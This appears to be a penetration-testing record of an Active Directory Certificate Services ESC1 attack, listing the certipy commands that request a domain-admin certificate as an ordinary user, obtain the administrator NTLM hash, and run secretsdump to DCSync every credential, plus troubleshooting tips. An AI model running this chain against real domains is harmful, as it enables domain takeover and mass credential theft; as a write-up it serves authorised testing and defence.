# [2026-03] AD CS ESC1 Certificate Template Abuse → Domain Admin Privileges

## Scenario classification
Penetration testing / AD attacks

## Target overview
Through an ESC1-vulnerable template of the AD CS certificate service, obtained a domain admin certificate as an ordinary domain user, and finally exported every credential with DCSync.

## Complete execution chain

1. Obtain an ordinary domain user credential (through password spraying)
2. Enumerate the AD CS configuration with certipy
   ```bash
   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
   ```
3. Find an ESC1-vulnerable template (arbitrary SAN allowed, low-privilege users may enroll)
4. Request a certificate as domain admin
   ```bash
   certipy req -u user@domain.local -p 'Password123' \
     -ca CORP-CA -template VulnTemplate \
     -upn administrator@domain.local -dc-ip 10.0.0.1
   ```
5. Authenticate with the certificate to get the NTLM hash
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
   ```
6. DCSync to dump every credential
   ```bash
   secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
   ```

## Pitfall record

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| certipy find times out | The LDAP connection is blocked by the firewall | Specify DNS with the -ns parameter instead | 20min |
| Certificate request rejected | The template requires Manager Approval | Switch to another template without approval | 10min |
| auth fails with KDC_ERR_PADATA | DC time out of sync | Sync the time with ntpdate and retry | 5min |

## Toolchain findings
- certipy is the first-choice tool for AD CS attacks, more convenient than Certify.exe (pure Python, runs directly on Kali)
- DNS resolution must be correct, otherwise Kerberos authentication fails

## Key code/commands
See the execution chain above.

## Reusable patterns/script snippets
```bash
# one-stop AD CS quick check
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
```

## Improvement suggestions for this package
- certipy has been added to the Kali bootstrap manifest ✓
- routing.md already has a "Certipy/AD CS" route ✓

## Evolution actions
- [x] No update needed (already covered)

## Environment information
- Kali 2026.1, certipy 4.8.2
- Target: Windows Server 2022, AD CS deployed
- Domain functional level: 2016
